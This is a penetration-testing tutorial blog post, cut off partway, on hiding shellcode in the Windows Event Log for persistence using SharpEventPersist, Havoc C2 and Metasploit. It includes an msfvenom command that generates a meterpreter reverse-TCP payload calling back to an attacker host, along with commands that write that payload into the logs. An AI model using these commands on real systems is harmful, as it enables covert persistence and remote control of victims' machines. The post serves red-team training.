---
title: Persistence – Event Log
url: https://pentestlab.blog/2024/01/08/persistence-event-log/
source: Over Security - Cybersecurity news aggregator
date: 2024-08-31
fetch_date: 2025-10-06T18:06:25.377862
---

# Persistence – Event Log

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [January 8, 2024December 31, 2023](https://pentestlab.blog/2024/01/08/persistence-event-log/)

# Persistence – Event Log

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[Leave a Comment on Persistence – Event Log](https://pentestlab.blog/2024/01/08/persistence-event-log/#respond)

Windows Event logs are the main source of information for defensive security teams to identify threats and for administrators to troubleshoot errors. The logs are represented in a structured format (XML) for easy review. In windows events logs are stored related to applications, security and system. Due to the nature of the information stored it is not uncommon for sophisticated threat actors and red teams to conduct attacks against Windows Event logs that will clear the logs, stop the service or the thread in order to prevent identification of arbitrary activities.

Log files are stored both in the registry and in a Windows folder and are accessible via the Event Viewer (eventvwr.exe).

```
%SystemRoot%\System32\Winevt\Logs\
Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\
```

Typically, administrators have the permissions to write binary data and text to event logs. Execution of the following command will write a text message into the *Application* logs with *EventID 916*.

```
Write-EventLog -LogName "Application" -Source "Microsoft-Windows-User-Loader" -EventId 916 -EntryType Information -Message "Pentestlab.blog" -Category 2 -RawData 65,66,67,68
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-write-log-entry.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-write-log-entry.png)

Write Event Log

It is also feasible to read logs from a PowerShell console in order to confirm that the event log has been created.

```
Get-EventLog -Newest 1 -LogName "Application" -Source "Microsoft-Windows-User-Loader" -Message "Provider Pentestlab*" | Format-List -Property *
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-read-log-entry.png?w=856)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-read-log-entry.png)

Read Log Entry

Since it is possible for an administrator to create event log entries and Windows Events are accepting binary data, it could be used as a storage of beacon during red team operations. The company Improsec developed a tool called *[SharpEventPersist](https://github.com/improsec/SharpEventPersist)* which can be used to write shellcode into the Windows Event log in order to establish persistence. The shellcode is converted to hexadecimal value and it is written in the *Key Management Service*. Improsec, also released a secondary binary which acts as a loader in order to retrieve and execute the shellcode from the Windows Event Log. The following diagram displays the technique:

[![](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-diagram.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-diagram.png)

Event Log Persistence – Diagram

Havoc C2 has the capability to generate Windows Shellcode in *.bin* format using a combination of evasion techniques.

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-bin-shellcode.png?w=570)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-bin-shellcode.png)

Havoc .bin Shellcode

Once the .bin shellcode is generated the file must transferred into the target host. Havoc C2 can execute .NET assemblies therefore the *SharpEventPersist* must be loaded into the memory of an existing implant. Execution of the command below will create an event log entry and store the shellcode.

```
dotnet inline-execute /home/kali/SharpEventPersist.exe -file C:\tmp\demon.x64.bin -instanceid 1337 -source 'Persistence' -eventlog 'Key Management Service'
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-sharpeventpersist.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-sharpeventpersist.png)

Havoc – SharpEventPersist

The following image represents the Event log entry with the arbitrary code.

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-shellcode.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-shellcode.png)

Event Log Shellcode

When the *SharpLoader* is executed the Shellcode will run and the implant will call back to the Command and Control Framework. The SharpLoader could be set to run in an automatic manner using a different method such as using a Scheduled Task, Registry Run keys or converted the executable into a DLL in order to side-load with another legitimate binary.

[![](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-c2.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/event-log-havoc-c2.png)

Havoc C2

## Metasploit

Metasploit Framework has similar capabilities both in generation of shellcode in .bin format and on the execution of .NET assemblies via the *execute-assembly* module. The utility *msfvenom* can generate x64 bit shellcode.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o beacon.bin LHOST=10.0.0.1 LPORT=2000
```

Once the *SharpEventPersist* is executed an entry will appear in the *Key Management Service* logs.

```
SharpEventPersist.exe -file beacon.bin -instanceid 1337 -source Persistence
```

Utilizing the *execute\_dotnet\_assembly* post exploitation module the *SharpEventPersist* will loaded into the memory of the process notepad.exe and an entry will appear in the *Key Management Service* logs.

```
use post/windows/manage/execute_dotnet_assembly
```

[![](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-sharpeventpersist-cmd.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-sharpeventpersist-cmd.png)

SharpEventPersist – CMD

[![](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-metasploit-execute-assembly.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-metasploit-execute-assembly.png)

Persistence Event Log – Metasploit Execute Assembly

[![](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-key-management-service.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2022/05/persistence-event-log-key-management-service.png)

Key Management Service

[![...